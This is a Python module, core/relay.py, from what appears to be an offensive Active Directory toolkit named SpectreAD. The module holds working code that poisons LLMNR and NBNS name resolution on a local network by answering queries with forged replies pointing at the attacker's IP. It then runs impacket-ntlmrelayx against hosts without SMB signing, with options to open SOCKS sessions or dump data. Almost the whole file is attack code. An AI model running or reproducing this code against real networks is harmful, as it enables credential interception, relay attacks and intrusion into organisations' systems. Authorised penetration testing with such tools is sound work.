"""
SpectreAD :: core/relay.py
LLMNR/NBNS poisoning + ntlmrelayx orchestration.

Author : Inayat Hussain
"""

from __future__ import annotations

import socket
import threading
import time

from core import ui
from core.store import open_store

LLMNR_MCAST = "224.0.0.252"


def _nbns_reply(name: bytes, ip: str) -> bytes:
    return (b"\x82\x28\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20" + name +
            b"\x00\x00\x21\x00\x01\x00\x00\x00\x00\x00\x00" +
            socket.inet_aton(ip) + b"\x00" * 6)


def poison(ip: str, seconds: int = 300, stop: threading.Event | None = None) -> None:
    stop = stop or threading.Event()
    llmnr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    llmnr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    llmnr.bind(("", 5355))
    llmnr.settimeout(1.0)
    try:
        llmnr.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                         socket.inet_aton(LLMNR_MCAST) + socket.inet_aton("0.0.0.0"))
    except OSError:
        pass

    nb = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    nb.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    nb.bind(("", 137))
    nb.settimeout(1.0)

    end, answered = time.time() + seconds, 0
    ui.info(f"poisoning LLMNR/NBNS for {seconds}s as {ip}")

    while time.time() < end and not stop.is_set():
        for sock, label in ((llmnr, "LLMNR"), (nb, "NBNS")):
            try:
                data, addr = sock.recvfrom(2048)
            except (socket.timeout, OSError):
                continue
            try:
                if label == "LLMNR":
                    sock.sendto(data[:2] + b"\x80\x00" + data[4:], addr)
                else:
                    sock.sendto(_nbns_reply(data[13:45], ip), addr)
                answered += 1
                ui.ok(f"{label} {addr[0]} poisoned")
            except OSError:
                pass

    llmnr.close()
    nb.close()
    ui.info(f"answered {answered} quer{'y' if answered == 1 else 'ies'}")


def relay(args) -> None:
    import shutil
    import subprocess

    with open_store(args.store) as store:
        candidates = [h["ip"] for h in store.hosts() if h["signing"] == "NOT required"]
        targets = args.relay_targets or ",".join(candidates)
        if not targets:
            ui.warn("no unsigned-SMB hosts cached — run smb first")
            return

        if not shutil.which("impacket-ntlmrelayx"):
            ui.warn("impacket-ntlmrelayx missing")
            return

        cmd = ["impacket-ntlmrelayx", "-t", targets, "-smb2support"]
        if args.socks:
            cmd.append("-socks")
        if args.dump:
            cmd.append("-dump")
        ui.edge(" ".join(cmd))

        proc = subprocess.Popen(cmd)
        try:
            poison(args.poison_ip, args.seconds)
        finally:
            proc.terminate()
